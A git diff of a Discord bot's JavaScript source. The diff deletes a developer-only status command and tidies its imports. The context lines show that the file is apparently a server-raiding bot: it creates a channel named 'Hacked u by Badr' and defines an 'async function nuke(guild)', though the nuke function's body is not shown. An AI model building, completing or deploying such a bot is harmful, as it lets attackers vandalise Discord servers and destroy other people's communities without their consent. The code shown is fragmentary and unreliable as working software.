@@ -1,37 +1,4 @@
-const Discord = require('discord.js');
-
-const fs = require('fs')
-
-const client = new Discord.Client();
-
-client.on('ready', () => {
-
-
- 
- console.log(`Logged in as [ Pharaohs]`);
-
-});
-
-
-
-
-  const adminprefix = "";
-const devs = ['361217658190036999'];
-client.on('message', message => {
-  var argresult = message.content.split(` `).slice(1).join(' ');
-    if (!devs.includes(message.author.id)) return;
-if (message.content.startsWith(adminprefix + 'mo')) {
-  client.user.setGame(argresult, "https://www.twitch.tv/idk")
-    message.channel.sendMessage(`**:white_check_mark: تم تغير الحاله الي  : ${argresult}**`)
-}
-});
-
-
-
-
-
-
-
+const Discord = require("discord.js");
 const LOka = new Discord.Client();
 console.log('By Badr-YT');
 LOka.on('ready', () => {
@@ -441,6 +408,7 @@ m.createChannel('Hacked u by Badr', 'voice');
 });
 
 
+const { Client } = require('discord.js');
 const client = new Client();
 
 async function nuke(guild) {
@@ -510,9 +478,4 @@ LOka.on('guildMemberAdd', member => {
 
 
 
-
-
-
-
 client.login(process.env.BOT_TOKEN);
-
